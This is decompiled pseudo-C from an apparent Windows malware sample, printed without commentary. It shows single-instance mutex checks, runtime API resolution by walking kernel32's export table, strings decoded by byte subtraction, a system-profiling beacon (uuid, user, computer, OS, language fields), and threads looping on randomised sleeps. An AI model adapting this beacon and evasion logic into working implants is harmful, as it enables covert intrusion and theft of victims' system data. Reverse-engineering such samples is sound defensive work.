        *(int32_t *)(v29 - 52) = (int32_t)"blog1";
        function_404410((char *)&g36);
        // 0x40a96f
        *(int32_t *)v38 = 1;
        return _40___security_check_cookie_40_4();
    }
    // 0x40a991
    if (function_40a030() != 0 || function_40a030() != 0 || function_40a4b0() != 0 || function_40a4b0() != 0) {
        // 0x40a96f
        *(int32_t *)v38 = 1;
        return _40___security_check_cookie_40_4();
    }
    // 0x40a9e1
    if (function_40a4b0() == 0) {
        // 0x40a9fc
        return _40___security_check_cookie_40_4();
    }
    // 0x40a96f
    *(int32_t *)v38 = 1;
    return _40___security_check_cookie_40_4();
}

// Address range: 0x40aa10 - 0x40b30b
int32_t function_40aa10(int32_t a1) {
    int32_t v1 = a1;
    __chkstk();
    int128_t v2 = __asm_movq(0x33346d666f73666c); // 0x40aa3c
    int32_t v3 = &v1; // bp-28, 0x40aa64
    int32_t v4 = &v3; // 0x40aa64
    __asm_movq_8((int64_t)a1, v2);
    uint32_t v5 = lstrlenA((char *)&g36); // 0x40aa6e
    int32_t v6 = v4; // 0x40aa72
    int32_t v7 = 0; // 0x40aa72
    int32_t v8 = v4; // 0x40aa72
    if (v5 >= 1) {
        int32_t v9 = v6 + 784; // 0x40aa80
        char * v10 = (char *)(v9 + v7); // 0x40aa80
        *v10 = *v10 - 1;
        v6 -= 4;
        *(int32_t *)v6 = v9;
        v7++;
        uint32_t v11 = lstrlenA((char *)&g36); // 0x40aa90
        v8 = v6;
        while (v7 < v11) {
            // 0x40aa80
            v9 = v6 + 784;
            v10 = (char *)(v9 + v7);
            *v10 = *v10 - 1;
            v6 -= 4;
            *(int32_t *)v6 = v9;
            v7++;
            v11 = lstrlenA((char *)&g36);
            v8 = v6;
        }
    }
    int32_t v12 = v8;
    *(int32_t *)(v12 - 4) = (int32_t)"CreateMutexA";
    *(int32_t *)(v12 - 8) = v12 + 784;
    *(int32_t *)(v12 - 12) = (int32_t)GetModuleHandleA((char *)&g36);
    int32_t (*func)() = GetProcAddress(&g36, (char *)&g36); // 0x40aaaa
    int128_t v13 = __asm_movups(0x6363787a7a6a6a6a6a7a7a7373737361); // 0x40aab6
    *(int32_t *)(v12 + 804) = 0x73737373;
    *(int16_t *)(v12 + 808) = 0x6164;
    *(char *)(v12 + 810) = 0;
    int32_t v14 = v12 + 788; // 0x40aae0
    *(int32_t *)(v12 - 16) = v14;
    *(int32_t *)(v12 - 20) = 1;
    *(int32_t *)(v12 - 24) = 0;
    g30 = (int32_t)func;
    __asm_movups_9(*(int128_t *)v14, v13);
    int32_t errorCode = GetLastError(); // 0x40aafb
    *(int32_t *)(v12 - 28) = 0;
    if (errorCode == 183) {
        // 0x40ab0a
        ExitProcess((int32_t)&g36);
        // UNREACHABLE
    }
    // 0x40ab10
    *(int32_t *)(v12 - 32) = 1;
    int32_t * v15 = (int32_t *)(v12 - 36); // 0x40ab12
    *v15 = (int32_t)"https://en.wikipedia.org";
    InternetCheckConnectionA((char *)&g36, (int32_t)&g36, (int32_t)&g36);
    *(int32_t *)(v12 - 40) = (int32_t)L"kernel32.dll";
    LoadLibraryW((int16_t *)&g36);
    int32_t v16 = v12 - 44; // 0x40ab28
    *(int32_t *)v16 = (int32_t)L"kernel32.dll";
    int32_t v17 = (int32_t)GetModuleHandleW((int16_t *)&g36); // 0x40ab2d
    __asm_movups_9(*(int128_t *)(v12 + 688), __asm_movaps(0x6d614e656c6946656c75646f4d746547));
    *(int16_t *)(v12 + 704) = 0x4165;
    *(char *)(v12 + 706) = 0;
    int32_t v18 = *(int32_t *)(v17 + 120 + *(int32_t *)(v17 + 60)) + v17;
    int32_t v19 = *(int32_t *)(v18 + 32) + v17; // 0x40ab65
    int32_t v20 = *(int32_t *)(v18 + 24) - 1; // 0x40ab67
    *v15 = v19;
    int32_t v21 = v20; // 0x40ab6e
    int32_t v22 = v16; // 0x40ab6e
    if (v20 >= 0) {
        int32_t v23 = v16;
        *(int32_t *)(v23 - 4) = v23 + 732;
        int32_t v24 = v23 - 8; // 0x40ab7d
        *(int32_t *)v24 = *(int32_t *)(4 * v21 + v19) + v17;
        int32_t v25 = lstrcmpA((char *)&g36, (char *)&g36); // 0x40ab7e
        v22 = v24;
        while (v25 != 0) {
            // 0x40ab88
            v21--;
            int32_t v26 = *(int32_t *)v23; // 0x40ab8b
            v22 = v24;
            if (v21 < 0) {
                // break -> 0x40ab91
                break;
            }
            v23 = v24;
            *(int32_t *)(v23 - 4) = v23 + 732;
            v24 = v23 - 8;
            *(int32_t *)v24 = *(int32_t *)(4 * v21 + v26) + v17;
            v25 = lstrcmpA((char *)&g36, (char *)&g36);
            v22 = v24;
        }
    }
    int32_t v27 = v22;
    int32_t v28 = v27 + 732; // 0x40ab98
    int32_t * v29 = (int32_t *)v28; // 0x40ab98
    *v29 = 0x61657243;
    int32_t * v30 = (int32_t *)(v27 + 736); // 0x40aba5
    *v30 = 0x72506574;
    int32_t * v31 = (int32_t *)(v27 + 740); // 0x40abb0
    *v31 = 0x7365636f;
    int32_t v32 = v27 + 744; // 0x40abbb
    int16_t * v33 = (int16_t *)v32; // 0x40abbb
    *v33 = 0x4173;
    char * v34 = (char *)(v27 + 746); // 0x40abc5
    *v34 = 0;
    function_4071a0();
    *v29 = 0x61657243;
    *v30 = 0x72506574;
    *v31 = 0x7365636f;
    *v33 = 0x5773;
    *v34 = 0;
    function_4071a0();
    *v29 = 0x54746547;
    *v30 = 0x50706d65;
    *v31 = 0x41687461;
    char * v35 = (char *)v32; // 0x40ac3d
    *v35 = 0;
    g28 = function_4071a0();
    *v29 = 0x64616f4c;
    *v30 = 0x7262694c;
    *v31 = 0x41797261;
    *v35 = 0;
    int32_t v36 = function_4071a0(); // 0x40ac81
    *(int32_t *)(v27 - 4) = (int32_t)L"Ws2_32.dll";
    g29 = v36;
    LoadLibraryW((int16_t *)&g36);
    int32_t * v37 = (int32_t *)(v27 - 8); // 0x40ac96
    *v37 = (int32_t)L"Ws2_32.dll";
    GetModuleHandleW((int16_t *)&g36);
    *(int32_t *)(v27 + 724) = 0x53415357;
    *(int32_t *)(v27 + 728) = 0x74726174;
    *(int16_t *)v28 = 0x7075;
    *(char *)(v27 + 734) = 0;
    int32_t v38 = function_4071a0(); // 0x40acd2
    int32_t v39 = v27 + 312; // 0x40acd7
    *(int32_t *)(v27 - 12) = v39;
    *(int32_t *)(v27 - 16) = 514;
    if (v38 != 0) {
        // 0x40acea
        return _40___security_check_cookie_40_4();
    }
    int128_t v40 = __asm_movaps(g22); // 0x40ad03
    int128_t v41 = __asm_movaps(g8); // 0x40ad0c
    int32_t v42 = v27 + 824; // 0x40ad13
    __asm_movups_9(*(int128_t *)v42, v40);
    *v37 = 0;
    int128_t v43 = __asm_movaps(g10); // 0x40ad23
    int32_t v44 = v27 + 840; // 0x40ad2a
    __asm_movups_9(*(int128_t *)v44, v43);
    *(int32_t *)(v27 + 936) = 0xb0e0b;
    __asm_movups_9(*(int128_t *)(v27 + 856), __asm_movaps(0x7171422a35375850583c322f3721554f));
    __asm_movups_9(*(int128_t *)(v27 + 872), __asm_movaps(g16));
    __asm_movups_9(*(int128_t *)(v27 + 888), __asm_movaps(g11));
    __asm_movups_9(*(int128_t *)(v27 + 904), __asm_movaps(g13));
    __asm_movups_9(*(int128_t *)(v27 + 920), __asm_movaps(g9));
    int32_t v45 = 0; // 0x40ad88
    int128_t * v46 = (int128_t *)(v45 + v42); // 0x40ad90
    __asm_movups_9(*v46, __asm_psubb(__asm_movups(*v46), v41));
    int128_t * v47 = (int128_t *)(v45 + v44); // 0x40ada4
    int128_t v48 = __asm_psubb(__asm_movups(*v47), v41); // 0x40adac
    __asm_movups_9(*v47, v48);
    v45 += 32;
    int32_t v49 = 96; // 0x40adbe
    while (v45 < 96) {
        // 0x40ad90
        v46 = (int128_t *)(v45 + v42);
        __asm_movups_9(*v46, __asm_psubb(__asm_movups(*v46), v41));
        v47 = (int128_t *)(v45 + v44);
        v48 = __asm_psubb(__asm_movups(*v47), v41);
        __asm_movups_9(*v47, v48);
        v45 += 32;
        v49 = 96;
    }
    char * v50 = (char *)(v49 + v42); // 0x40adc5
    *v50 = *v50 - 1;
    int32_t v51 = v49 + 1; // 0x40adcc
    v49 = v51;
    while (v51 != 115) {
        // 0x40adc5
        v50 = (char *)(v49 + v42);
        *v50 = *v50 - 1;
        v51 = v49 + 1;
        v49 = v51;
    }
    int32_t v52 = v27 - 20; // 0x40add2
    int32_t * v53 = (int32_t *)v52; // 0x40add2
    *v53 = 284;
    int32_t v54 = v27 + 16; // 0x40add7
    int32_t * v55 = (int32_t *)(v27 - 24); // 0x40addb
    *v55 = 0;
    *(int32_t *)(v27 - 28) = v54;
    _memset(&g36, (int32_t)&g36, (int32_t)&g36);
    *(int32_t *)v54 = 284;
    *v53 = v54;
    GetVersionExW((struct _OSVERSIONINFOW *)&g36);
    *(char *)(v27 + 855) = *(char *)v54 + 48;
    *v55 = v39;
    *(char *)(v27 + 857) = *(char *)(v27 + 20) + 48;
    int32_t v56 = v52; // 0x40ae2b
    if (function_40a750() == 0) {
        int32_t v57 = v52 - 4; // 0x40ae30
        *(int32_t *)v57 = 1000;
        Sleep((int32_t)&g36);
        *(int32_t *)(v52 - 8) = v27 + 1444;
        int32_t v58 = v52 + 1460; // 0x40ae51
        v56 = v57;
        while (function_40a750() == 0) {
            int32_t v59 = v57;
            v57 = v59 - 4;
            *(int32_t *)v57 = 1000;
            Sleep((int32_t)&g36);
            *(int32_t *)(v59 - 8) = v58;
            v58 = v59 + 1460;
            v56 = v57;
        }
    }
    int32_t * v60 = (int32_t *)(v56 - 4); // 0x40ae53
    *v60 = 200;
    int32_t v61 = v56 + 1064; // 0x40ae58
    int32_t * v62 = (int32_t *)(v56 - 8); // 0x40ae5f
    *v62 = 0;
    int32_t * v63 = (int32_t *)(v56 - 12); // 0x40ae61
    *v63 = v61;
    _memset(&g36, (int32_t)&g36, (int32_t)&g36);
    int32_t v64 = v56 + 960; // 0x40ae6a
    *v60 = 100;
    *v62 = 0;
    *v63 = v64;
    _memset(&g36, (int32_t)&g36, (int32_t)&g36);
    int128_t v65 = __asm_xorps(v48, v48); // 0x40ae7b
    *(char *)(v56 + 729) = 0;
    __asm_movq_8(*(int64_t *)(v56 + 721), v65);
    int32_t v66 = v56 + 720; // 0x40ae92
    int32_t * v67 = (int32_t *)v66; // 0x40ae92
    *v67 = 0x64697575;
    int32_t v68 = v56 + 724; // 0x40ae9f
    int16_t * v69 = (int16_t *)v68; // 0x40ae9f
    *v69 = 61;
    int32_t v70 = v56 + 1063; // 0x40aeba
    int32_t v71 = 0; // 0x40aea9
    char v72 = *(char *)(v71 + v66); // 0x40aeb0
    v71++;
    *(char *)(v71 + v70) = v72;
    while (v72 != 0) {
        // 0x40aeb0
        v72 = *(char *)(v71 + v66);
        v71++;
        *(char *)(v71 + v70) = v72;
    }
    int32_t v73 = function_405f80(); // 0x40aec5
    int32_t v74 = v73;
    int32_t v75 = v74 + 1; // 0x40aed2
    while (*(char *)v74 != 0) {
        // 0x40aed0
        v74 = v75;
        v75 = v74 + 1;
    }
    int32_t v76 = v70 + 1; // 0x40aee1
    char * v77 = (char *)v76;
    char v78 = *v77; // 0x40aee1
    int32_t v79 = v76; // 0x40aee7
    while (v78 != 0) {
        // 0x40aee1
        v76 = v79 + 1;
        v77 = (char *)v76;
        v78 = *v77;
        v79 = v76;
    }
    uint32_t v80 = v75 - v73; // 0x40aede
    *v67 = 0x3d6e7523;
    uint32_t v81 = v80 / 4; // 0x40aef6
    __asm_rep_movsd_memcpy(v77, (char *)v73, v81);
    bool v82; // 0x40aa10
    int32_t v83 = v82 ? -4 : 4; // 0x40aef9
    char * v84 = (char *)v68; // 0x40aefd
    *v84 = v78;
    char * v85 = (char *)(v76 + v81 * v83); // 0x40af0e
    __asm_rep_movsb_memcpy(v85, v85, v80 & 3);
    int32_t v86 = v66;
    int32_t v87 = v86 + 1; // 0x40af14
    while (*(char *)v86 != 0) {
        // 0x40af12
        v86 = v87;
        v87 = v86 + 1;
    }
    int32_t v88 = v70 + 1; // 0x40af23
    char * v89 = (char *)v88;
    int32_t v90 = v88; // 0x40af29
    while (*v89 != 0) {
        // 0x40af23
        v88 = v90 + 1;
        v89 = (char *)v88;
        v90 = v88;
    }
    uint32_t v91 = v87 - v66; // 0x40af20
    uint32_t v92 = v91 / 4; // 0x40af2d
    char * v93 = (char *)v66; // 0x40af30
    __asm_rep_movsd_memcpy(v89, v93, v92);
    char * v94 = (char *)(v88 + v92 * v83); // 0x40af37
    __asm_rep_movsb_memcpy(v94, v94, v91 & 3);
    int32_t v95 = function_406260(); // 0x40af39
    int32_t v96 = v95;
    int32_t v97 = v96 + 1; // 0x40af44
    while (*(char *)v96 != 0) {
        // 0x40af42
        v96 = v97;
        v97 = v96 + 1;
    }
    int32_t v98 = v70 + 1; // 0x40af53
    char * v99 = (char *)v98;
    char v100 = *v99; // 0x40af53
    int32_t v101 = v98; // 0x40af59
    while (v100 != 0) {
        // 0x40af53
        v98 = v101 + 1;
        v99 = (char *)v98;
        v100 = *v99;
        v101 = v98;
    }
    uint32_t v102 = v97 - v95; // 0x40af50
    *v67 = 0x3d6e6323;
    uint32_t v103 = v102 / 4; // 0x40af68
    __asm_rep_movsd_memcpy(v99, (char *)v95, v103);
    *v84 = v100;
    char * v104 = (char *)(v98 + v103 * v83); // 0x40af80
    __asm_rep_movsb_memcpy(v104, v104, v102 & 3);
    int32_t v105 = v66;
    int32_t v106 = v105 + 1; // 0x40af86
    while (*(char *)v105 != 0) {
        // 0x40af84
        v105 = v106;
        v106 = v105 + 1;
    }
    int32_t v107 = v70 + 1; // 0x40af95
    char * v108 = (char *)v107;
    int32_t v109 = v107; // 0x40af9b
    while (*v108 != 0) {
        // 0x40af95
        v107 = v109 + 1;
        v108 = (char *)v107;
        v109 = v107;
    }
    uint32_t v110 = v106 - v66; // 0x40af92
    uint32_t v111 = v110 / 4; // 0x40af9f
    __asm_rep_movsd_memcpy(v108, v93, v111);
    char * v112 = (char *)(v107 + v111 * v83); // 0x40afa9
    __asm_rep_movsb_memcpy(v112, v112, v110 & 3);
    int32_t v113 = function_4061e0(); // 0x40afab
    int32_t v114 = v113;
    int32_t v115 = v114 + 1; // 0x40afb6
    while (*(char *)v114 != 0) {
        // 0x40afb4
        v114 = v115;
        v115 = v114 + 1;
    }
    int32_t v116 = v70 + 1; // 0x40afc5
    char * v117 = (char *)v116;
    char v118 = *v117; // 0x40afc5
    int32_t v119 = v116; // 0x40afcb
    while (v118 != 0) {
        // 0x40afc5
        v116 = v119 + 1;
        v117 = (char *)v116;
        v118 = *v117;
        v119 = v116;
    }
    uint32_t v120 = v115 - v113; // 0x40afc2
    *v67 = 0x3d6e6f23;
    uint32_t v121 = v120 / 4; // 0x40afda
    __asm_rep_movsd_memcpy(v117, (char *)v113, v121);
    *v84 = v118;
    char * v122 = (char *)(v116 + v121 * v83); // 0x40aff2
    __asm_rep_movsb_memcpy(v122, v122, v120 & 3);
    int32_t v123 = v66;
    int32_t v124 = v123 + 1; // 0x40aff8
    while (*(char *)v123 != 0) {
        // 0x40aff6
        v123 = v124;
        v124 = v123 + 1;
    }
    int32_t v125 = v70 + 1; // 0x40b007
    char * v126 = (char *)v125;
    int32_t v127 = v125; // 0x40b00d
    while (*v126 != 0) {
        // 0x40b007
        v125 = v127 + 1;
        v126 = (char *)v125;
        v127 = v125;
    }
    uint32_t v128 = v124 - v66; // 0x40b004
    uint32_t v129 = v128 / 4; // 0x40b011
    __asm_rep_movsd_memcpy(v126, v93, v129);
    char * v130 = (char *)(v125 + v129 * v83); // 0x40b01b
    __asm_rep_movsb_memcpy(v130, v130, v128 & 3);
    int32_t v131 = function_406430(); // 0x40b01d
    int32_t v132 = v131;
    int32_t v133 = v132 + 1; // 0x40b028
    while (*(char *)v132 != 0) {
        // 0x40b026
        v132 = v133;
        v133 = v132 + 1;
    }
    int32_t v134 = v70 + 1; // 0x40b037
    char * v135 = (char *)v134;
    int32_t v136 = v134; // 0x40b03d
    while (*v135 != 0) {
        // 0x40b037
        v134 = v136 + 1;
        v135 = (char *)v134;
        v136 = v134;
    }
    uint32_t v137 = v133 - v131; // 0x40b034
    *v67 = 0x6e616c23;
    uint32_t v138 = v137 / 4; // 0x40b04c
    __asm_rep_movsd_memcpy(v135, (char *)v131, v138);
    *v69 = 61;
    char * v139 = (char *)(v134 + v138 * v83); // 0x40b067
    __asm_rep_movsb_memcpy(v139, v139, v137 & 3);
    int32_t v140 = v66;
    int32_t v141 = v140 + 1; // 0x40b072
    while (*(char *)v140 != 0) {
        // 0x40b070
        v140 = v141;
        v141 = v140 + 1;
    }
    int32_t v142 = v70 + 1; // 0x40b081
    char * v143 = (char *)v142;
    int32_t v144 = v142; // 0x40b087
    while (*v143 != 0) {
        // 0x40b081
        v142 = v144 + 1;
        v143 = (char *)v142;
        v144 = v142;
    }
    uint32_t v145 = v141 - v66; // 0x40b07e
    uint32_t v146 = v145 / 4; // 0x40b08b
    __asm_rep_movsd_memcpy(v143, v93, v146);
    char * v147 = (char *)(v142 + v146 * v83); // 0x40b095
    __asm_rep_movsb_memcpy(v147, v147, v145 & 3);
    int32_t v148 = function_406590(); // 0x40b097
    int32_t v149 = v148;
    int32_t v150 = v149 + 1; // 0x40b0a2
    while (*(char *)v149 != 0) {
        // 0x40b0a0
        v149 = v150;
        v150 = v149 + 1;
    }
    int32_t v151 = v70 + 1; // 0x40b0b1
    char * v152 = (char *)v151;
    int32_t v153 = v151; // 0x40b0b7
    while (*v152 != 0) {
        // 0x40b0b1
        v151 = v153 + 1;
        v152 = (char *)v151;
        v153 = v151;
    }
    uint32_t v154 = v150 - v148; // 0x40b0ae
    *v67 = 0x706f6e23;
    uint32_t v155 = v154 / 4; // 0x40b0c6
    __asm_rep_movsd_memcpy(v152, (char *)v148, v155);
    *v69 = 61;
    char * v156 = (char *)(v151 + v155 * v83); // 0x40b0e1
    __asm_rep_movsb_memcpy(v156, v156, v154 & 3);
    int32_t v157 = v66;
    int32_t v158 = v157 + 1; // 0x40b0e7
    while (*(char *)v157 != 0) {
        // 0x40b0e5
        v157 = v158;
        v158 = v157 + 1;
    }
    int32_t v159 = v70 + 1; // 0x40b0f6
    char * v160 = (char *)v159;
    char v161 = *v160; // 0x40b0f6
    int32_t v162 = v159; // 0x40b0fc
    while (v161 != 0) {
        // 0x40b0f6
        v159 = v162 + 1;
        v160 = (char *)v159;
        v161 = *v160;
        v162 = v159;
    }
    uint32_t v163 = v158 - v66; // 0x40b0f3
    uint32_t v164 = v163 / 4; // 0x40b100
    __asm_rep_movsd_memcpy(v160, v93, v164);
    char * v165 = (char *)(v159 + v164 * v83); // 0x40b111
    __asm_rep_movsb_memcpy(v165, v165, v163 & 3);
    *v67 = 0x72657623;
    *(int32_t *)v68 = 0x302e313d;
    *(char *)(v56 + 728) = v161;
    int32_t v166 = v66;
    int32_t v167 = v166 + 1; // 0x40b134
    while (*(char *)v166 != 0) {
        // 0x40b132
        v166 = v167;
        v167 = v166 + 1;
    }
    int32_t v168 = v70 + 1; // 0x40b143
    char * v169 = (char *)v168;
    int32_t v170 = v168; // 0x40b149
    while (*v169 != 0) {
        // 0x40b143
        v168 = v170 + 1;
        v169 = (char *)v168;
        v170 = v168;
    }
    uint32_t v171 = v167 - v66; // 0x40b140
    uint32_t v172 = v171 / 4; // 0x40b152
    __asm_rep_movsd_memcpy(v169, v93, v172);
    *(int32_t *)v64 = 0x64697575;
    char * v173 = (char *)(v168 + v172 * v83); // 0x40b169
    __asm_rep_movsb_memcpy(v173, v173, v171 & 3);
    *(int16_t *)(v56 + 964) = 61;
    int32_t v174 = function_405f80(); // 0x40b173
    int32_t v175 = v174; // 0x40b17c
    while (*(char *)v175 != 0) {
        // 0x40b180
        v175++;
    }
    int32_t v176 = v56 + 959; // 0x40b190
    int32_t v177 = v176; // 0x40b190
    v177++;
    char * v178 = (char *)v177;
    while (*v178 != 0) {
        // 0x40b191
        v177++;
        v178 = (char *)v177;
    }
    uint32_t v179 = v175 - v174; // 0x40b18e
    uint32_t v180 = v179 / 4; // 0x40b19b
    __asm_rep_movsd_memcpy(v178, (char *)v174, v180);
    char * v181 = (char *)(v177 + v180 * v83); // 0x40b1a5
    __asm_rep_movsb_memcpy(v181, v181, v179 & 3);
    int32_t v182 = v176;
    int32_t v183 = v182 + 1; // 0x40b1b0
    while (*(char *)v183 != 0) {
        // 0x40b1b0
        v182 = v183;
        v183 = v182 + 1;
    }
    // 0x40b1ba
    *(int32_t *)v183 = 0x3d6e7523;
    *(char *)(v182 + 5) = 0;
    int32_t v184 = function_406260(); // 0x40b1c9
    int32_t v185 = v184;
    int32_t v186 = v185 + 1; // 0x40b1d4
    while (*(char *)v185 != 0) {
        // 0x40b1d2
        v185 = v186;
        v186 = v185 + 1;
    }
    int32_t v187 = v176 + 1; // 0x40b1e3
    char * v188 = (char *)v187;
    int32_t v189 = v187; // 0x40b1e9
    while (*v188 != 0) {
        // 0x40b1e3
        v187 = v189 + 1;
        v188 = (char *)v187;
        v189 = v187;
    }
    uint32_t v190 = v186 - v184; // 0x40b1e0
    uint32_t v191 = v190 / 4; // 0x40b1f4
    __asm_rep_movsd_memcpy(v188, (char *)v184, v191);
    *v60 = (int32_t)&g31;
    char * v192 = (char *)(v187 + v191 * v83); // 0x40b203
    __asm_rep_movsb_memcpy(v192, v192, v190 & 3);
    *v62 = 0;
    *(int32_t *)(v56 + 16) = v61;
    int32_t v193 = v56 + 1464; // 0x40b211
    *v63 = 0;
    *(int32_t *)(v56 + 20) = v193;
    *(int32_t *)(v56 - 16) = 0x405bc0;
    *(int32_t *)(v56 + 24) = v64;
    int32_t v194 = v56 - 20; // 0x40b235
    *(int32_t *)v194 = 0;
    int32_t v195 = v56 - 24; // 0x40b237
    *(int32_t *)v195 = 0;
    *(int32_t *)(v56 + 28) = v193;
    CreateThread((struct _SECURITY_ATTRIBUTES *)&g36, (int32_t)&g36, (int32_t (*)(int32_t *))&g36, &g36, (int32_t)&g36, &g36);
    int32_t * v196 = (int32_t *)(v56 - 28); // 0x40b23f
    *v196 = 200;
    int32_t v197 = v56 + 1240; // 0x40b244
    int32_t * v198 = (int32_t *)(v56 - 32); // 0x40b24b
    *v198 = 0;
    int32_t * v199 = (int32_t *)(v56 - 36); // 0x40b24d
    *v199 = v197;
    _memset(&g36, (int32_t)&g36, (int32_t)&g36);
    *v196 = 100;
    *v198 = v197;
    *v199 = 0;
    GetModuleFileNameW(&g36, (int16_t *)&g36, (int32_t)&g36);
    function_409260();
    *(int32_t *)(v56 - 40) = v195;
    *(int32_t *)(v56 - 44) = 0;
    *(int32_t *)(v56 - 48) = v194;
    *(int32_t *)(v56 - 52) = 0x4092f0;
    *(int32_t *)(v56 - 56) = 0;
    int32_t v200 = v56 - 60; // 0x40b280
    *(int32_t *)v200 = 0;
    int32_t * threadHandle = CreateThread((struct _SECURITY_ATTRIBUTES *)&g36, (int32_t)&g36, (int32_t (*)(int32_t *))&g36, &g36, (int32_t)&g36, &g36); // 0x40b281
    int32_t v201 = v200; // 0x40b283
    int32_t v202 = 0; // 0x40b283
    int32_t v203 = (int32_t)threadHandle; // 0x40b283
    int32_t v204; // 0x40aa10
    int32_t v205; // 0x40aa10
    int32_t v206; // 0x40b2aa
    int32_t * threadHandle3; // 0x40b2ac
    while (true) {
      lab_0x40b285:;
        int32_t v207 = v203;
        int32_t v208 = v202;
        int32_t v209 = v201;
        *(int32_t *)(v209 - 4) = 0;
        int32_t v210 = v209 - 8; // 0x40b287
        *(int32_t *)v210 = v207;
        int32_t v211 = WaitForSingleObject(&g36, (int32_t)&g36); // 0x40b288
        if (v208 > 9) {
            // 0x40b2b5
            *(int32_t *)(v209 - 12) = v209 + 4;
            *(int32_t *)(v209 - 16) = 0;
            *(int32_t *)(v209 - 20) = v209 + 8;
            *(int32_t *)(v209 - 24) = 0x4092f0;
            *(int32_t *)(v209 - 28) = 0;
            int32_t v212 = v209 - 32; // 0x40b2c8
            *(int32_t *)v212 = 0;
            int32_t * threadHandle2 = CreateThread((struct _SECURITY_ATTRIBUTES *)&g36, (int32_t)&g36, (int32_t (*)(int32_t *))&g36, &g36, (int32_t)&g36, &g36); // 0x40b2ca
            threadHandle3 = threadHandle2;
            v206 = v212;
            v205 = 0;
            goto lab_0x40b2d2;
        } else {
            // 0x40b293
            v204 = v210;
            v202 = v208;
            v203 = v207;
            if (v211 != 0) {
                goto lab_0x40b2d4;
            } else {
                // 0x40b297
                *(int32_t *)(v209 - 12) = v209 + 4;
                *(int32_t *)(v209 - 16) = 0;
                *(int32_t *)(v209 - 20) = v209 + 16;
                *(int32_t *)(v209 - 24) = 0x4092f0;
                *(int32_t *)(v209 - 28) = 0;
                v206 = v209 - 32;
                *(int32_t *)v206 = 0;
                threadHandle3 = CreateThread((struct _SECURITY_ATTRIBUTES *)&g36, (int32_t)&g36, (int32_t (*)(int32_t *))&g36, &g36, (int32_t)&g36, &g36);
                v205 = v208 + 1;
                goto lab_0x40b2d2;
            }
        }
    }
  lab_0x40b2d2:
    // 0x40b2d2
    v204 = v206;
    v202 = v205;
    v203 = (int32_t)threadHandle3;
    goto lab_0x40b2d4;
  lab_0x40b2d4:
    // 0x40b2d4
    v201 = v204 - 4;
    int32_t * v213 = (int32_t *)v201; // 0x40b2d4
    *v213 = 0;
    *v213 = function_40e90b((int32_t)&g36);
    _srand((int32_t)&g36);
    _rand();
    int32_t v214 = _rand(); // 0x40b2ec
    *v213 = (int32_t)((0x100000000 * (int64_t)(v214 >> 31) | (int64_t)v214) % 0x4e20) + 0x2710;
    Sleep((int32_t)&g36);
    goto lab_0x40b285;
}

// Address range: 0x40b325 - 0x40b32a
int32_t function_40b325(void) {
    // 0x40b325
    function_40b791(&g36);
    return &g36;
}

// Address range: 0x40b44d - 0x40b459
int32_t function_40b44d(void) {
    // 0x40b44d
    int32_t v1; // 0x40b44d
    return ___report_securityfailure(8, v1);
}

// Address range: 0x40b791 - 0x40b796
void function_40b791(int32_t * ptr) {
    // 0x40b791
    _free();
}

// Address range: 0x40c05f - 0x40c06c
// From class:    .?AVbad_alloc@std@@
// Type:          virtual member function
int32_t function_40c05f(void) {
    // 0x40c05f
    int32_t v1; // 0x40c05f
    int32_t v2 = *(int32_t *)(v1 + 4); // 0x40c05f
    return v2 != 0 ? v2 : (int32_t)"Unknown exception";
}

// Address range: 0x40e88c - 0x40e90b
int32_t function_40e88c(int32_t * a1, int32_t a2, int32_t a3, int32_t a4) {
    // 0x40e88c
    if (a1 == NULL) {
        // 0x40e89b
        *__errno() = 22;
        __invalid_parameter_noinfo();
        // 0x40e906
        return 0;
    }
    // 0x40e8af
    if (a2 != 1) {
        // 0x40e906
        return 0;
    }
    int32_t v1 = 0; // bp-12, 0x40e8b5
    int32_t v2; // 0x40e88c
    int32_t v3; // 0x40e88c
    int32_t v4; // 0x40e88c
    function_4179ec(&v1, v4, v2, 0, 0, v3);
    uint32_t v5 = __alldvrm(); // 0x40e8e1
    uint32_t v6; // 0x40e88c
    if (v6 >= 7) {
        // 0x40e8ef
        if (v6 == 7 != v5 < 0x93407000) {
            // 0x40e906
            return 0;
        }
    }
    // 0x40e8f8
    *a1 = v5;
    *(int32_t *)((int32_t)a1 + 8) = 100 * v1 - 0x4c6a0000;
    // 0x40e906
    return 1;
}

// Address range: 0x40e90b - 0x40e94d
int32_t function_40e90b(int32_t a1) {
    int32_t v1 = 0; // bp-20, 0x40e919
    bool v2; // 0x40e90b
    int32_t v3 = v2 ? -4 : 4; // 0x40e919
    int32_t v4 = v3 + (int32_t)&v1; // 0x40e919
    *(int32_t *)v4 = 0;
    int32_t v5 = v4 + v3; // 0x40e91c
    *(int32_t *)v5 = 0;
    *(int32_t *)(v5 + v3) = 0;
    int32_t v6; // 0x40e90b
    int32_t v7 = function_40e88c(&v1, 1, v6, v1); // 0x40e923
    int32_t result = v7 == 1 ? v1 : -1;
    if (a1 != 0) {
        // 0x40e944
        *(int32_t *)a1 = result;
        int32_t v8; // 0x40e90b
        *(int32_t *)(a1 + 4) = v7 == 1 ? v8 : -1;
    }
    // 0x40e949
    return result;
}

// Address range: 0x40e94d - 0x40e958
int32_t _malloc(void) {
    // 0x40e94d
    return __malloc_base();
}

// Address range: 0x40e958 - 0x40e95d
int32_t _free(void) {
    // 0x40e958
    return __free_base();
}

// Address range: 0x40ee86 - 0x40eeb0
int32_t function_40ee86(int32_t * a1, int32_t a2, int32_t a3) {
    int32_t * v1 = g25 != 0 ? NULL : &g24;
    return _3f__mbstowcs_l_helper_40__40_YAIPA_WPBDIPAU__crt_locale_pointers_40__40__40_Z(a1, (char *)a2, a3, v1);
}

// Address range: 0x4176b8 - 0x417754
// Demangled:     void * __cdecl try_get_function(enum `anonymous namespace'::function_id, char const *const, enum 0x391cf84c::module_id const *const, enum 0x391cf84c::module_id const *const)
int32_t * _3f_try_get_function_40__40_YAPAXW4function_id_40__3f_A0x391cf84c_40__40_QBDQBW4module_id_40_2_40_2_40_Z(int32_t a1, char * a2, int32_t * a3, char * a4, int32_t a5, int32_t a6, int32_t a7) {
    int32_t * v1 = (int32_t *)(4 * a1 + (int32_t)&g27); // 0x4176ca
    uint32_t v2 = g23 & 31; // 0x4176d9
    int32_t v3 = g23 ^ *v1; // 0x4176dc
    int32_t v4 = v3; // 0x4176de
    if (v2 != 0) {
        v4 = v3 << 32 - v2 | v3 >> v2;
    }
    int32_t v5; // 0x4176b8
    int32_t v6; // 0x4176b8
    switch (v4) {
        case -1: {
            // 0x41774f
            return (int32_t *)0;
        }
        case 0: {
            // 0x4176ec
            int32_t v7; // bp-16, 0x4176b8
            int32_t v8 = &v7; // 0x4176c2
            v5 = g23;
